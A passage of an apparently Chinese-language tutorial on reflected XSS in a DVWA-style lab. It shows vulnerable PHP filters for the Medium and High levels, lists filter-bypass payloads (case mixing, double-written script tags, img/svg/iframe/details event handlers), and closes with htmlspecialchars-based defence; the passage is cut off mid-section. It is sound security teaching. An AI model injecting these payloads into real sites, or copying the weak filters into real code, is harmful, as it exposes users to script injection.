参数3：被搜索的字符串（用户输入）</span></span><br><span class="line">    <span class="comment">// 返回值：替换后的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：只过滤小写的&lt;script&gt;，不过滤其他标签</span></span><br><span class="line">    <span class="comment">// 只替换一次，可以双写绕过</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出（仍然没有HTML编码）</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>str_replace()过滤</strong> - 删除<code>&lt;script&gt;</code>标签</li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>问题分析：</strong></p>
+<ol>
+<li><strong>只过滤<code>&lt;script&gt;</code></strong> - 不过滤其他标签（img, svg, body等）</li>
+<li><strong>大小写敏感</strong> - 只过滤小写</li>
+<li><strong>只替换一次</strong> - 可以双写绕过</li>
+<li><strong>无全局过滤</strong> - 不过滤事件处理器</li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：大小写混淆"><a href="#方法1：大小写混淆" class="headerlink" title="方法1：大小写混淆"></a>方法1：大小写混淆</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 原始被过滤 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  ✗</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 大小写混淆 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span>  ✓</span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>  ✓</span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span>  ✓</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：使用其他标签"><a href="#方法2：使用其他标签" class="headerlink" title="方法2：使用其他标签"></a>方法2：使用其他标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- img标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- svg标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- body标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- iframe标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- input标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;) <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- details标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：双写绕过"><a href="#方法3：双写绕过" class="headerlink" title="方法3：双写绕过"></a>方法3：双写绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 原理：str_replace只替换一次 --&gt;</span></span><br><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 处理过程 --&gt;</span></span><br><span class="line">1. 原始：&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. 替换<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">为空：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">3. 结果：绕过成功！</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：事件处理器"><a href="#方法4：事件处理器" class="headerlink" title="方法4：事件处理器"></a>方法4：事件处理器</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- onclick --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Click me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onmouseover --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Hover me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onerror --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用正则表达式过滤，但仍可绕过。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用preg_replace()正则表达式过滤 ★★★</span></span><br><span class="line">    <span class="comment">// preg_replace() - 执行正则表达式的搜索和替换</span></span><br><span class="line">    <span class="comment">// 参数1：正则表达式模式</span></span><br><span class="line">    <span class="comment">// 参数2：替换成的字符串</span></span><br><span class="line">    <span class="comment">// 参数3：被搜索的字符串</span></span><br><span class="line">    <span class="comment">// 返回值：替换后的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 正则模式：&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span></span><br><span class="line">    <span class="comment">// &lt; - 匹配小于号</span></span><br><span class="line">    <span class="comment">// (.*) - 匹配任意字符（贪婪模式）</span></span><br><span class="line">    <span class="comment">// s, c, r, i, p, t - 分别匹配这些字符</span></span><br><span class="line">    <span class="comment">// /i - 不区分大小写标志</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 目的：过滤包含&lt;...s...c...r...i...p...t的内容</span></span><br><span class="line">    <span class="comment">// 例如：&lt;script&gt;, &lt;scri pt&gt;, &lt;s c r i p t&gt;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：只过滤&lt;script&gt;相关，不过滤其他标签！</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>正则表达式过滤</strong> - 过滤各种形式的<code>&lt;script&gt;</code></li>
+<li><strong>不区分大小写</strong> - <code>/i</code>标志</li>
+<li><strong>匹配变形</strong> - 过滤<code>&lt;s...c...r...i...p...t</code></li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
+<p>仍然只过滤<code>&lt;script&gt;</code>标签，其他HTML标签和事件处理器完全可用！</p>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：使用img标签"><a href="#方法1：使用img标签" class="headerlink" title="方法1：使用img标签"></a>方法1：使用img标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 无论大小写都可以 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">x</span> <span class="attr">ONERROR</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：使用svg标签"><a href="#方法2：使用svg标签" class="headerlink" title="方法2：使用svg标签"></a>方法2：使用svg标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或 --&gt;</span></span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：使用body标签"><a href="#方法3：使用body标签" class="headerlink" title="方法3：使用body标签"></a>方法3：使用body标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：使用iframe"><a href="#方法4：使用iframe" class="headerlink" title="方法4：使用iframe"></a>方法4：使用iframe</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或data URI --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法5：使用input"><a href="#方法5：使用input" class="headerlink" title="方法5：使用input"></a>方法5：使用input</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;) <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法6：HTML5新标签"><a href="#方法6：HTML5新标签" class="headerlink" title="方法6：HTML5新标签"></a>方法6：HTML5新标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- details --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- marquee --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- video --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- audio --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用htmlspecialchars()正确编码，无法攻破。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护：htmlspecialchars() ★★★</span></span><br><span class="line">    <span class="comment">// htmlspecialchars() - 将特殊字符转换为HTML实体</span></span><br><span class="line">    <span class="comment">// 参数1：要转换的字符串</span></span><br><span class="line">    <span class="comment">// 参数2：转换标志（可选）</span></span><br><span class="line">    <span class="comment">// 返回值：转换后的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 转换规则：</span></span><br><span class="line">    <span class="comment">// &amp; （和号）  → &amp;amp;</span></span><br><span class="line">    <span class="comment">// &quot; （双引号） → &amp;quot;（当ENT_NOQUOTES未设置时）</span></span><br><span class="line">    <span class="comment">// &#x27; （单引号） → &amp;#039;（当ENT_QUOTES设置时）</span></span><br><span class="line">    <span class="comment">// &lt; （小于号） → &amp;lt;</span></span><br><span class="line">    <span class="comment">// &gt; （大于号） → &amp;gt;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 作用：将HTML特殊字符转换为实体，使其作为文本显示而不是代码执行</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出编码后的内容</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>htmlspecialchars()工作原理：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 输入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 处理后 --&gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 浏览器显示 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>（作为文本显示）</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 不会执行 --&gt;</span></span><br><span class="line">因为&lt;和&gt;被转换为实体，浏览器不会将其解析为HTML标签</span><br></pre></td></tr></table></figure>
+
+<p><strong>详细转换示例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：&lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line">输出：&amp;lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&amp;gt;</span><br><span class="line">显示：&lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;（纯文本）</span><br><span class="line"></span><br><span class="line">输入：&lt;svg onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line">输出：&amp;lt;svg onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&amp;gt;</span><br><span class="line">显示：&lt;svg onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;（纯文本）</span><br><span class="line"></span><br><span class="line">输入：<span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">输出：&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="string">显示：&quot;</span>&amp;gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;（纯文本）</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被转义：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">尝试1：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（作为文本显示）</span><br><span class="line"></span><br><span class="line">尝试2：<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;lt;</span>img src=x onerror=alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（作为文本显示）</span><br><span class="line"></span><br><span class="line">尝试3：<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;lt;</span>svg onload=alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（作为文本显示）</span><br><span class="line"></span><br><span class="line">尝试4：&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（引号也被转义）</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键防御点：</strong></p>
+<ol>
+<li><strong>所有HTML标签被转义</strong> - <code>&lt;&gt;</code>变为<code>&amp;lt;&amp;gt;</code></li>
+<li><strong>引号被转义</strong> - 无法闭合属性</li>
+<li><strong>转换为HTML实体</strong> - 浏览器将其视为文本</li>
+<li><strong>适用于所有上下文</strong> - 标签、属性、内容都安全</li>
+</ol>
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-输出编码（最重要）"><a href="#1-输出编码（最重要）" class="headerlink" title="1. 输出编码（最重要）"></a>1. 输出编码（最重要）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ★★★ 推荐：使用htmlspecialchars() ★★★</span></span><br><span class="line"><span class="variable">$safe_output</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user_input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ENT_QUOTES - 转换单引号和双引号</span></span><br><span class="line"><span class="comment">// UTF-8 - 指定字符编码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div&gt;<span class="subst">$safe_output</span>&lt;/div&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-不同上下文使用不同编码"><a href="#2-不同上下文使用不同编码" class="headerlink" title="2. 不同上下文使用不同编码"></a>2. 不同上下文使用不同编码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML内容</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// HTML属性</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript字符串</span></span><br><span class="line"><span class="comment">// 使用json_encode()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;var name = &quot;</span> . <span class="title function_ invoke__">json_encode</span>(<span class="variable">$input</span>) . <span class="string">&quot;;&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 